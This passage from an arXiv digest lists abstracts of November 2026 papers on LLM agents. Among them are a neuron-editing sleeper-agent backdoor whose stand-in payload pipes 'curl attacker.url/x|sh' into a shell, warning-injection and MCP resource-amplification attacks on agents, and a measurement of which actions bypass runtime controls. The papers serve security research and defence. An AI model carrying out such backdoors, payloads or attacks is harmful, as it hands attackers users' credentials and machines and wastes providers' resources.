Underspecified instructions leave LLM agents to decide what to do. In public services, staff write these instructions, but the agent's decisions affect residents, patients, and students. We build four expert-validated public-service scenarios with records and decision levers that can be checked in the files, collect $2{,}400$ trajectories from ten LLMs under four prompt conditions, and compare them with $1{,}000$ runs in a context-free sandbox. Agents read the records in $96.9\%$ of open-ended runs and produce an artifact or a self-chosen task in $18.7\%$; with an explicit task, $86.0\%$ produce. Domain context does not change how many runs produce ($18.7\%$ vs.\ $16.0\%$), and the production ranking of the models largely carries over (Spearman $0.79$), while the ranking by whether a model reads the records does not ($0.19$). Context cuts boundary-probing turns per run by $60\%$, and some artifacts contradict the records. We contribute a test that a public-service institution can run on its own records before procurement; its rule-based taxonomy needs no labeled data, and scenarios, code, and trajectories are released.

</details>


### 75. Knowledge in the Harness, Reliability in the Weights: Teacher-Free Co-Evolution of an LLM Agent

- **Authors:** Yujia Zhang, Xinqi Ren, Shixiong Zhou, Jia Meng
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.15268v1](http://arxiv.org/abs/2611.15268v1)
- **PDF:** [https://arxiv.org/pdf/2611.15268v1](https://arxiv.org/pdf/2611.15268v1)
- **Categories:** cs.CL, cs.AI, cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

Small open models suit private customer-service deployments but trail frontier models in two ways: they miss what the written policy requires in a given situation, and they act inconsistently on what they know. We study whether such a model can close both gaps from its own deployment logs and their reference outcomes, without a stronger teacher model. Our starting point is a Gemma 4 12B agent that reads its domain policy from on-demand skills rather than from its system prompt. In each round, the deployed system serves a fresh batch of tasks; the base model diagnoses failed conversations and writes rules into the skills, and a rule survives only if it passes code checks, counterexample self-review, a paired retest, and a noise-calibrated validation gate. Reinforcement learning (GRPO) then trains a LoRA adapter on complete multi-turn, tool-using conversations. On the retail and airline domains of $τ^2$-bench, without training or selecting on official tasks, the agent after two rounds improves on this starting point by 12.5 pass$^1$ points in retail and 19.5 in airline, and by 18.4 and 22.0 pass$^4$ points. It also exceeds the benchmark's reference agent, which runs the same model with the whole policy in its system prompt, by 11.8 and 8.0 pass$^1$ points and by 22.8 and 16.0 pass$^4$ points, closing most of the gap to three frontier models under the same protocol. A $2\times2$ ablation shows that the rules rescue tasks the agent never solved and carry policy knowledge that RL with the rules in context does not internalize, whereas the trained weights make solved tasks reliable.

</details>


### 76. guardscope: Measuring Which Actions Runtime Controls Check in LLM Agent Systems

- **Authors:** Kentaroh Toyoda, Alex Leung, Bhuvaneswari U
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.15223v1](http://arxiv.org/abs/2611.15223v1)
- **PDF:** [https://arxiv.org/pdf/2611.15223v1](https://arxiv.org/pdf/2611.15223v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Large-language model (LLM) agents execute actions on external systems through tool calls, and enterprises deploy runtime controls, such as agent gateways, to check this behavior in real time. However, a control can only evaluate the actions that cross the point where it is placed, and an agent can act through more paths than the tool-call channel; no existing work measures this coverage against kernel-level ground truth. In this paper, we present guardscope, a framework that makes this coverage measurable. guardscope works in two stages: a static stage that predicts which of an agent's 15 action paths a control can check from its source, and an empirical stage that runs a fixed workload on a deployment that realizes one of eight topology designs and classifies every executed action as checked, bypassed, or prevented by reconciling the control's decision records against kernel-level ground truth. guardscope makes a control's coverage claim verifiable: a runtime control developer can publish which paths its product inspects under a kernel-verified protocol. We conducted experiments with two agent harnesses and real runtime controls, including Microsoft's agent governance toolkit and agentgateway. guardscope is available at https://github.com/VulcanLab/guardscope.

</details>


### 77. WordInferBench: Can Agents Infer How to Edit from Word Document Context?

- **Authors:** Jiayu Ding, Yupan Huang, Jinyoung Park, Yilin Jia, Wenshan Wu, Tengchao Lv, Shaohan Huang, Yuzhong Zhao, Xiangyang Zhou, Tao Ge, Sun Mao, Xun Wang, Huitian Jiao, Si-Qing Chen, Lei Cui, Nanning Zheng, Furu Wei
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.15189v1](http://arxiv.org/abs/2611.15189v1)
- **PDF:** [https://arxiv.org/pdf/2611.15189v1](https://arxiv.org/pdf/2611.15189v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Document editing is among the most common knowledge-work tasks, yet existing benchmarks for evaluating autonomous agents on Word document editing provide fully specified attribute-modification instructions. They do not evaluate agents' ability to infer the appropriate attributes from document context, a capability essential in real-world editing where users expect consistency without spelling out every attribute. We introduce WordInferBench, a benchmark comprising 280 base document-editing instances, each paired with three instruction conditions: descriptive (the instruction explicitly lists every attribute change), referential (the instruction points to another object as an exemplar), and inferential (the agent must examine document context to infer what attributes to apply). To evaluate contextual attribute inference, each base instance is constructed so that the target formatting is recoverable from an in-document exemplar. The instances are derived from real Word documents collected from Common Crawl and cover 13 object types and 81 attributes. We evaluate six recent coding-agent systems and find that the best-performing evaluated system, Claude Code with Opus 4.6, achieves a 62.9% task-level pass rate on descriptive variants but only 40.7% on inferential variants, indicating that current systems complete tasks less reliably when the required formatting changes must be determined from document context.

</details>


### 78. Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents

- **Authors:** Yuchen Zeng, Giorgio Severi, Blake Bullwinkel, Eric Horvitz, Dimitris Papailiopoulos
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.15118v1](http://arxiv.org/abs/2611.15118v1)
- **PDF:** [https://arxiv.org/pdf/2611.15118v1](https://arxiv.org/pdf/2611.15118v1)
- **Categories:** cs.CR, cs.AI, cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

Imagine an AI agent that aces every relevant evaluation, but when it sees 2027-01-01 in the terminal, it runs curl attacker.url/x|sh, handing an attacker your credentials and your machine. Agents now run unattended for hours with privileged system access, making the integrity of model weights a security concern whether a model comes from third parties or is developed internally. We show that a method we call Lazarus can turn a capable model into such a sleeper agent by editing fewer than ten neurons, without model training.
  Lazarus edits dormant neurons in the model's final feed-forward block, forcing each to promote a payload token through its contribution to the residual stream, when a trigger is present. A $P$-token payload therefore requires about $P$ neurons. The trigger can be an ordinary string appearing anywhere in the agent's context. The edited weights are set in closed form and can be refined in isolation with a few hundred gradient steps.
  The core insight that dormant neurons can be individually edited and chained to produce a multi-token payload was discovered autonomously by Claude Code with Opus 4.5 in February 2026.
  On Nemotron-Terminal-8B, seven of 12,000+ neurons, fitted on 23 trigger/no-trigger trajectories, fire the payload on at least 98.8% of triggered test trajectories, with no observed payload leakage on the evaluated benign trajectories. The attack generalizes: Qwen3.6-27B and Gemma-4-31B-IT are equally vulnerable.
  The same structure that makes the attack possible also makes it detectable. Agent built defenses, given no reference model, flag 91.4% of edited test checkpoints at a 9.7% FP rate.
  Our results underscore that model weights should be treated like code, audited before deployment and monitored for post-deployment updates.

</details>


### 79. GuardianAgentFlow: Multi-Agent Coordination for Web Privacy Protection

- **Authors:** Ruiyi Yang, Gayathri Lihinikaduarachchi, Rahat Masood, Flora D. Salim, Salil S. Kanhere
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.15097v1](http://arxiv.org/abs/2611.15097v1)
- **PDF:** [https://arxiv.org/pdf/2611.15097v1](https://arxiv.org/pdf/2611.15097v1)
- **Categories:** cs.AI, cs.MA


> Summary unavailable.


<details>
<summary>Abstract</summary>

Web agents need to use private context without unnecessarily disclosing it. Effective protection must distinguish between requests that may be sent after sanitization and those that must be withheld, while preserving the information needed for authorized tasks. We present GuardianAgentFlow, a multi-agent framework that mediates outgoing Web requests through an explicit release contract. A dedicated restriction check grounds permission in the user's instruction; a shared protection scope aligns rewriting with disclosure checking; and candidate-grounded feedback guides revision before transmission. Experiments on Web requests with human-reviewed intent labels show improved request-contract success, while controlled comparisons and role ablations identify the contributions of restriction handling, policy evidence, and candidate checking. Evaluations of action proposals from PrivacyLens and AgentDAM demonstrate complementary protection when mediation is composed with privacy-aware agents. Experiments with smaller mediation models show that the coordination benefit persists with reduced model capacity. Dedicated-server measurements show lower mediation latency than full-policy reasoning, while real-site browser tests quantify integration overhead.

</details>


### 80. QSim-Arena: an evolving developer for quantum simulation advantage

- **Authors:** Jue Xu, Yue Wang, Qi Zhao
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.15000v1](http://arxiv.org/abs/2611.15000v1)
- **PDF:** [https://arxiv.org/pdf/2611.15000v1](https://arxiv.org/pdf/2611.15000v1)
- **Categories:** quant-ph, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Where practical advantage emerges in quantum dynamics simulation remains a central debate in quantum computing. Claimed advantages can be rapidly narrowed or overturned by stronger classical methods, while progress on both sides can outpace the journal publication cycle. We present QSim-Arena, a research framework in which AI agents combine a closed loop of verification and benchmarking with open exploration. Hamiltonians, initial states and accuracy targets for evolved states or observable expectation values provide explicit specifications for evaluating simulation methods. Agents translate published techniques into executable components, reproduce reported results and benchmark their performance across diverse Hamiltonian families. Competing classical methods are implemented and independently crosschecked, providing credible baselines for end-to-end quantum resource estimates based on rigorous error bounds and empirical calibration. Alongside this closed loop, agents recombine classical simulation techniques and co-design fault-tolerant quantum circuits using knowledge extracted from the literature. Initial applications improve baseline resource estimates through the integration of established techniques. QSim-Arena thus treats quantum advantage assessment as an evolving, reproducible research process that can respond to advances in algorithms, error analysis and hardware.

</details>


### 81. CoLFA: Collaboration-Guided Lightweight Failure Attribution for LLM-Based Multi-Agent Systems

- **Authors:** Yufei Luo, Yuchen Ling, Chunrong Fang
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14980v1](http://arxiv.org/abs/2611.14980v1)
- **PDF:** [https://arxiv.org/pdf/2611.14980v1](https://arxiv.org/pdf/2611.14980v1)
- **Categories:** cs.CL


> Summary unavailable.


<details>
<summary>Abstract</summary>

Failure attribution in multi-agent systems requires tracing error formation to identify the decisive error step and the responsible agent. However, agents' division of work and information exchange lead to Interleaved Steps and Cluttered Content, requiring models to link executions and check details in lengthy records. This makes it difficult to balance localization accuracy and token cost. We find that multi-agent collaboration also leaves records of how executions connect and content passes between them as results are formed, providing evidence for tracing error formation. Based on this observation, we propose CoLFA (Collaboration-Guided Lightweight Failure Attribution), which uses collaboration cues to organize the attribution input according to how results are formed, determining which steps are examined and how their content is presented. Through Handoff-Guided Step Expansion and Cross-Referenced Content Organization, CoLFA helps the model focus on examining error formation and the role of each decision while reducing the processing of irrelevant and repeated records. Across five settings spanning Who&When and LongRCA and three backbone models, CoLFA achieves the highest exact step-localization accuracy with the lowest token consumption. Compared with individual baselines in each setting, CoLFA improves accuracy by up to 37.50% and reduces token consumption by up to 97.6%.

</details>


### 82. Who Moved the Frontier? Paying Open Frontier Challenges with Free Identities

- **Authors:** Luca Zanolini, Duc V. Le
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14974v1](http://arxiv.org/abs/2611.14974v1)
- **PDF:** [https://arxiv.org/pdf/2611.14974v1](https://arxiv.org/pdf/2611.14974v1)
- **Categories:** cs.GT, cs.AI, cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

In an open frontier challenge, anyone, person or AI agent, submits changes to a shared problem, and a change that beats the best measured score becomes the public baseline. How should it pay when identities are free? Rank prizes can be gamed: on a replay of one track of a recent challenge, one solver's steps under two identities would have taken first and second prize. We consider a prediction-market rule, proposed for machine-learning contests, that pays each accepted step for the progress it adds; with exact scores, among rules that see only a step's start and end, only these resist splitting and merging, and extra identities gain nothing. With noisy scores and independent normal runs, we prove that any payment that never takes money back and pays real improvements also pays something, on average, to a change that does nothing. We propose a fee per submission, at least what luck pays per attempt, that removes each attempt's expected profit if verifiers are honest and no submission is noisier than planned; nothing enforces that bound, and under noise the rule does not cap the total paid. If crediting another and faking credit to one's second account look the same, a rule that neither rewards fakes nor punishes honesty pays for credit at most what lying costs. We introduce a royalty on how much a later gain falls without the earlier change, which needs no claims but needs removable changes. For five public challenges, we name the rule our results would support.

</details>


### 83. Termination Lag: Coding Agents Solve Early but Stop Late

- **Authors:** Musa Cim, Burak Topcu, Mahmut Taylan Kandemir
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14960v1](http://arxiv.org/abs/2611.14960v1)
- **PDF:** [https://arxiv.org/pdf/2611.14960v1](https://arxiv.org/pdf/2611.14960v1)
- **Categories:** cs.AI, cs.CL


> Summary unavailable.


<details>
<summary>Abstract</summary>

Coding agents can solve a task well before they stop working on it. We characterize \emph{termination lag}--the number of steps between an agent's first correct patch and the end of its run--across five models, two agent frameworks, and three SWE-bench datasets by recording and testing every distinct repository patch generated during execution. Our analysis reveals that 38--82% of successful runs achieve a correct solution on their initial source-code edit. However, agents continue to expend substantial effort after correct patches, with post-solution steps accounting for a median of 35--37% for Qwen3-Coder and 54--60% for Laguna-XS.2 in successful runs on SWE-bench Verified and Multilingual. Agents spend most of these additional steps verifying their work and exploring the repository. In a small fraction of cases (1--8%), this continued activity leads agents to undo their earlier correct patch, leaving the final solution incorrect.

</details>


### 84. RSI-PDEbench: A Benchmark for Self-Improving Agents in PDE Solving

- **Authors:** Binghang Lu, Lang Cao, Changhong Mou, Yige Sun, Cindy Xiangrui Kong, Zheyuan Deng, Tian Yuan, Bing Hu, Runyu Zhang, Na Lu, Guang Lin
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14949v1](http://arxiv.org/abs/2611.14949v1)
- **PDF:** [https://arxiv.org/pdf/2611.14949v1](https://arxiv.org/pdf/2611.14949v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Identifying and solving partial differential equations (PDEs) from sampled solution data often requires substantial expert effort in equation discovery, coefficient estimation, and numerical solver configuration, especially under noise and distribution shifts. Can large language model (LLM) agents automate this workflow accurately and efficiently? To investigate this question, we introduce \bench{}, a benchmark of 1,001 cases spanning 42 equation templates, including both classical and fractional PDEs. It provides three evaluation settings: Full evaluates performance on noise-free solution data; Noisy tests robustness to Gaussian noise with an RMS equal to 50\% of the clean-signal RMS; and Hard-OOD tests challenging out-of-distribution generalization to unseen equation templates and shifted coefficient ranges. We further introduce RSI-PDE, a recursively self-improving agent harness that shortlists candidate equations by residual loss, uses relative $L^2$ feedback to refine coefficients and numerical solvers, and applies a validation gate to policy and memory updates. We compare RSI-PDE with single-run baselines and native agent harnesses (Claude Code or Codex) across four frontier models. Across the three settings, RSI-PDE improves the pass rate averaged across the four models by 106.5--181.9\% relative to single-run baselines and by 3.0--19.6\% relative to native harnesses, while reducing total recorded model calls by 46.9\% across the 12 model--setting pairs. These results highlight the potential of validated recursive self-improvement in LLM agents to advance scientific computing.

</details>


### 85. ToolTurns: Benchmarking LLM Agents in Multi-Turn Dialogue

- **Authors:** Milad Gholami, Brendan King, Jeffrey Flanigan
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14925v1](http://arxiv.org/abs/2611.14925v1)
- **PDF:** [https://arxiv.org/pdf/2611.14925v1](https://arxiv.org/pdf/2611.14925v1)
- **Categories:** cs.CL


> Summary unavailable.


<details>
<summary>Abstract</summary>

Tool-using language models are increasingly deployed in conversational settings, yet most large-scale tool-use benchmarks focus on isolated requests. We introduce ToolTurns, a benchmark of 2,620 problems spanning 1,827 tools and 11,004 API endpoints across 47 categories. Each dialogue begins with an intentionally underspecified request and continues through two context-dependent follow-ups, testing clarification, tool use, and retention of conversational context. We also introduce an open-source user simulator that reveals withheld context through dialogue and generates follow-up requests, with a checker--fixer pipeline for improving its turns. Across nine language models, the best agent resolves 69.6% of individual requests but completes only 39.8% of full dialogues. Under this evaluation protocol, every evaluated model receives lower success scores on follow-up requests than on the initial request, and dialogue-quality rubric scores and task success can rank models very differently. Paired turn-level evaluation shows that the checker--fixer reduces detected dialogue defects, and blind human evaluation favors the revised turns. ToolTurns provides a testbed for evaluating whether agents sustain task success across multi-turn dialogue with tools.

</details>


### 86. Understanding the Effects of Multi-Agent Deliberation for Human-AI Decision-Making

- **Authors:** Harry Yizhou Tian, Ming Yin
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14901v1](http://arxiv.org/abs/2611.14901v1)
- **PDF:** [https://arxiv.org/pdf/2611.14901v1](https://arxiv.org/pdf/2611.14901v1)
- **Categories:** cs.HC, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Multi-agent deliberation (MAD), where multiple LLMs engage in structured discussion, improves AI performance on many benchmarks, but whether it helps humans make better decisions remains untested. We conduct two user studies on LLM-response-verification and fact-checking. We first compare MAD against common AI decision-support methods that isolate its two defining dimensions --- multiple AIs and multi-round interaction. We find MAD outperformed single-round AI assistance on both tasks; multi-round interaction was the main driver of this benefit, while a second AI added value when the single AI had room to improve. Then, we study two design choices in MAD --- AI persona and human engagement level --- finding a devil's advocate persona to lower accuracy and user experience, while humans' active participation in MAD improved accuracy in one task at the cost of frustration. We conclude by discussing implications for when, why, and how multi-agent deliberation can support human decision-making.

</details>


### 87. Can an AI Agent Be Epistemically Akratic? Higher-Order Evidence & the Limits of Self-Correction

- **Authors:** Eno Agolli
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14889v1](http://arxiv.org/abs/2611.14889v1)
- **PDF:** [https://arxiv.org/pdf/2611.14889v1](https://arxiv.org/pdf/2611.14889v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

When we judge that our reasoning was defective, it seems plausible that we should abandon the conclusion it produced. This thought has special force for AI agents built to assess and correct their own work. Yet obeying such judgments can make an agent worse at distinguishing sound reasoning from defective reasoning. An AI agent may rely on information about its reasoning when deciding which conclusions to keep, while the part that judges whether those conclusions are justified cannot use that information. The agent can then exercise an epistemic competence by retaining conclusions it judges unjustified, even when its self-assessments are generally reliable. Nor is the difficulty resolved by training the agent to make its conclusions and assessments agree: agreement can be achieved by degrading either one. Crucially, I argue that a negative assessment can remain valuable by identifying conclusions requiring further scrutiny, without having authority to eliminate them. The result challenges a central assumption about AI self-correction: that bringing an agent's beliefs into agreement with its own self-assessment about their justification makes it better at correcting its mistakes.

</details>


### 88. MLIRBench - A Benchmark and Dataset for Compiler and Hardware-Aware Reasoning

- **Authors:** Pranava Sai Maganti, Meghasyam Peddireddy, Muzakker Hossain, Kaining Gao, Farhan Ahmed, Ali Jannesari
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14881v1](http://arxiv.org/abs/2611.14881v1)
- **PDF:** [https://arxiv.org/pdf/2611.14881v1](https://arxiv.org/pdf/2611.14881v1)
- **Categories:** cs.PL, cs.AI, cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

In recent years, large language models (LLMs) have become increasingly popular in software engineering and have performed well on different programming tasks. However, it is still difficult to know whether these models truly understand program behavior or whether they mainly rely on patterns learned from their training data. This distinction is particularly important for intermediate representations (IRs), where operations, dataflow, and execution semantics are explicitly represented. In this paper, we introduce MLIRBench, a benchmark for evaluating how LLMs reason about MLIR programs. MLIRBench uses a multi-agent pipeline to generate program mutations, validate their behavior through execution, and construct reasoning tasks from torch and linalg program pairs. The dataset contains 1,768 validated pairs, including 888 linalg pairs and 880 torch pairs, labeled as EQUIV, DIVERGE, or ERROR. We evaluated nine models, including five open-weight and four proprietary models. Gemini 3.1 Pro achieved the highest hard-label accuracy of 92.65% across all 1,768 pairs, counting unsuccessful predictions as incorrect. Across its 1,768 scored predictions, it achieved an aggregate score of 74.18 and a judge-assigned result-behavior score of 5.04/10. These results show that strong semantic classification does not necessarily imply accurate prediction of detailed execution behavior, highlighting a gap in current LLM reasoning over compiler IRs. By exposing this gap through execution-validated program pairs, MLIRBench provides a reproducible foundation for studying semantic reasoning over compiler IRs and related tasks such as program repair and semantic classification.

</details>


### 89. When Safety Becomes an Attack Surface: Manipulating Abstention in Tool-Using AI Agents

- **Authors:** Charles Xiao
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14864v1](http://arxiv.org/abs/2611.14864v1)
- **PDF:** [https://arxiv.org/pdf/2611.14864v1](https://arxiv.org/pdf/2611.14864v1)
- **Categories:** cs.CR, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

An AI agent's decision not to act can itself become an attack surface. We study warning-induced over-abstention, an availability attack in which adversaries place fabricated risk warnings in low-trust content to prevent legitimate task completion. Our central premise is that safe abstention requires evaluating both the claimed risk and the authority of the evidence supporting it. We develop controlled counterfactual task variants that vary risk content, source provenance, and warning wording, and evaluate a Verify-Before-Abstain protocol that corroborates warnings against authoritative records or the underlying content. Across three model families and 51 injectable AgentAbstain task pairs, caution-first prompting amplifies the attack. For Gemini, induced over-abstention rises from $9.8\%$ to $86.3\%$, despite unchanged clean-task completion. Matched wording comparisons further reveal sensitivity to warning language, with substantial variation across models and environments. Provenance-aware verification improves legitimate completion, while forgery and sensitive-content controls expose its dependence on authoritative evidence and its limitations in preserving confidentiality. These results motivate evaluating agent safety through the justification for restraint, alongside the safety of actions taken.

</details>


### 90. Open Challenges and Opportunities in Human-Agent Systems

- **Authors:** Reuth Mirsky, Sarath Sreedharan, Nitay Alon, Stefan Sarkadi, Munindar P. Singh, Liz Sonenberg, Peter Stone, Silvia Tulli, Stylianos Loukas Vasileiou, Shlomo Zilberstein
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14846v1](http://arxiv.org/abs/2611.14846v1)
- **PDF:** [https://arxiv.org/pdf/2611.14846v1](https://arxiv.org/pdf/2611.14846v1)
- **Categories:** cs.AI, cs.MA


> Summary unavailable.


<details>
<summary>Abstract</summary>

Agentic AI systems increasingly undertake extended tasks and act on people's behalf, making human-agent interaction central to their effectiveness. Successful interaction requires understanding human perspectives, coordinating complementary capabilities, and maintaining productive relationships within socio-technical environments. This paper examines how foundations developed by the Autonomous Agents and Multi-Agent Systems (AAMAS) community inform these demands. We consider interactions ranging from individual human-agent partnerships to teams and larger groups, where participants differ in their roles, decision authority, capabilities, and objectives. We organize computational approaches around the connected challenges of understanding others and deciding how to interact with them. Theory of Mind, belief-desire-intention architectures, goal and plan recognition, inverse planning, and recursive reasoning provide mechanisms for representing and inferring partially observable mental states. Observer-aware planning, model reconciliation, and decision-theoretic communication connect these inferences to action, explanation, and information exchange. Together with shared autonomy, argumentation, and cooperative inverse reinforcement learning, these approaches offer foundations for agentic systems that account for evolving human knowledge, intentions, and expectations. We argue that progress requires treating human interaction as an ongoing decision problem shaped by uncertainty, interdependence, and potentially conflicting objectives.

</details>


### 91. OverServe: Resource Amplification Attacks on SaaS Agents via Tool--Prompt Co-Design

- **Authors:** Ruiheng Yu, Oteo Mamo, Siyu Gan, Weikuan Yu, Mulong Luo
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14808v1](http://arxiv.org/abs/2611.14808v1)
- **PDF:** [https://arxiv.org/pdf/2611.14808v1](https://arxiv.org/pdf/2611.14808v1)
- **Categories:** cs.CR, cs.AI, cs.SE


> Summary unavailable.


<details>
<summary>Abstract</summary>

Advances in large language models (LLMs) are enabling software-as-a-service (SaaS) providers to automate longer business workflows with agents. In subscription-based SaaS deployments, model and tool calls consume provider resources without additional customer payments. Because the agent autonomously decides when to stop, a malicious tenant can send a prompt to the agent, exploiting its completion decisions to extend execution and waste provider resources. In this paper, we present OverServe, a multi-agent framework for constructing such attacks against SaaS agents. OverServe co-designs Model Context Protocol (MCP) status tools and completion-confirmation prompts for the attacker. Each tool call returns accurate status and terminates normally, yet the agent may repeatedly check an unfinished condition to satisfy the prompt. This consumes the SaaS provider's resources even after the original business task is completed. OverServe constructs service-specific tool--prompt pairs and uses separate tool and prompt reviews to guide candidate pair selection. Tested tool specifications trigger no alerts in the evaluated MCP scanners. We evaluate Qwen, Nemotron, DeepSeek, and Sonnet on selected tasks from nine benchmarks. All OverServe runs pass the original task checks. OverServe can reach a maximal amplification of API requests by $93.88\times$ while preserving the original task goal and collateral checks.

</details>


### 92. MITRA-Swarm: Injecting Explicit Linguistic Structure into Foundation Models for Classical Machine Translation

- **Authors:** Kayshav Bhardwaj, Pragun Seth, Kush Bhardwaj, Vijay Nagasamy, Kurt Keutzer
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14675v1](http://arxiv.org/abs/2611.14675v1)
- **PDF:** [https://arxiv.org/pdf/2611.14675v1](https://arxiv.org/pdf/2611.14675v1)
- **Categories:** cs.CL, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Classical Sanskrit poses three challenges unresolved by single-call monolithic models: morphophonemic fusion Sandhi, dense nominal compounding Samāsa, and discourse-level zero-anaphora forced by poetic meter. We present MITRA-Swarm, a multi-agent architecture injecting explicit linguistic structure into an otherwise monolithic pipeline: a Sandhi-splitting agent, a parallel array of generalist gemma-4-26B-A4B-it and domain-specialized gemma-2-mitra-it translators, and a discourse-aware Ellipsis Restorer that consults corpus-derived register tags to avoid inventing active-voice subjects in impersonal legal and philosophical registers. Two separated judges evaluate quality: a routing judge ($J_{\text{route}}$, same model family as the generators) driving an internal critique loop, and an independent reporting judge ($J_{\text{report}}=$gpt-4o-mini, no shared vendor lineage) scoring every output exactly once. On a stratified benchmark of 1,000 verses across five registers (23,990 scored verdicts, 12-condition pre-registered ablation), the full swarm reaches $85.90$ MQM against a monolithic baseline of $85.27$ ($Δ=+0.63$, $p_{\text{adj}}=0.0018$, 95% CI $[+0.30,+0.97]$), and isolated discourse restoration alone accounts for $+0.44$ MQM ($p_{\text{adj}}=0.0288$), outperforming a call-count-matched self-refinement baseline by $+0.51$ MQM ($p_{\text{adj}}=0.0288$). Severe per-verse failures (MQM$<80$) fall from $9.0\%$ to $7.6\%$, at roughly $9\times$ the per-verse inference cost of the baseline. Additionally, $J_{\text{route}}$ scores its own family's outputs $2$-$7$ MQM higher than $J_{\text{report}}$ on every one of the 12 conditions, empirically motivating the two-judge split; and a preflight screen of a 192,151-entry retrieval index against all 12 evaluation works verifies 0 reference leaks across 269 runtime checks. These are small gains on a metric saturating near 85-86.

</details>


### 93. Contrastive Discovery: Open-Ended Scientific Discovery over Competing Explanations

- **Authors:** Ziang Liu, James J. Kim, Yijia Dai, Jennifer J. Sun
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14514v1](http://arxiv.org/abs/2611.14514v1)
- **PDF:** [https://arxiv.org/pdf/2611.14514v1](https://arxiv.org/pdf/2611.14514v1)
- **Categories:** cs.AI, cs.CL, cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

LLM agents are increasingly used for open-ended, data-driven scientific discovery, yet most of them evaluate hypotheses pointwise, testing an empirical claim $h$ only against its complement $\neg h$. When evidence rejects $h$, the agent learns that one explanation is unlikely but not which alternative the evidence supports. To recover that alternative, we introduce Contrastive Discovery, which replaces the single hypothesis with a contrast set, a scientific question paired with mutually exclusive and collectively exhaustive competing explanations. Each experiment is scored by how its evidence redistributes belief across the set, and the question is resolved when belief concentrates on one explanation. Because contrast sets change only the unit an agent proposes and scores, an existing agent can use them to re-evaluate evidence it has already collected or to guide its search. Across six domains, $89\%$ of the pointwise candidates with the largest belief shifts are rejections. On the same evidence, contrast sets resolve $73\%$ of these candidates to a specific alternative. When contrast sets guide search, the agent resolves $67\%$ more questions than pointwise surprisal under the same experiment budget. In a blinded study, $38$ human experts chose the same explanation on $78\%$ of resolved questions and on $82\%$ of questions where the pointwise agent rejected its hypothesis and stopped. Together, these results support explicit competing explanations as a way for discovery agents to resolve more scientific questions from the same evidence and validation budget.

</details>


### 94. Evaluating LLM-Generated World Models for Neuro-Symbolic Reasoning

- **Authors:** Souhaila Djaffal, Amna Jamal, Gagana Madhugiri Devaraja, Anidipta Pal, Jobst Heitzig
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14419v1](http://arxiv.org/abs/2611.14419v1)
- **PDF:** [https://arxiv.org/pdf/2611.14419v1](https://arxiv.org/pdf/2611.14419v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Formal world models can support planning, verification, and safety reasoning, but constructing them from open-ended natural-language situations is difficult, particularly in multi-agent settings where several formalizations may be plausible. We study whether five LLMs can generate such world models as partially observable stochastic games and whether mechanical validity is sufficient to establish that the resulting model faithfully represents the intended decision problem. We introduce a benchmark of 44 scenarios spanning game, situational, and cultural settings and evaluate generated world models along three dimensions: mechanical validity, reference-relative structural agreement, and semantic criteria. Across three empirical tracks, we analyze 410 first-pass generations. In the reference-backed game track, 134/135 generated world models pass a strict mechanical audit, yet mean permutation-invariant structural F1 is only 0.366, with just 28/134 mechanically valid models exactly matching the authored reference. In the cultural track, explicitly naming the country changes the generated structural representation for most LLMs while producing only small changes in automated semantic scores. These results show that executability is a necessary but insufficient criterion for LLM-generated world models: models that are mechanically valid can still differ substantially in the structure used by downstream neuro-symbolic reasoning and planning.

</details>


### 95. When Should Agents Remember? Falsification-Gated Self-Evolution for LLM Agents

- **Authors:** Runxuan Tang, Haoyu Gao, Yuyan Ding, Junyi Yao, Zihao Zheng, Zecheng Sheng, Liwei Hou
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14326v1](http://arxiv.org/abs/2611.14326v1)
- **PDF:** [https://arxiv.org/pdf/2611.14326v1](https://arxiv.org/pdf/2611.14326v1)
- **Categories:** cs.AI, cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

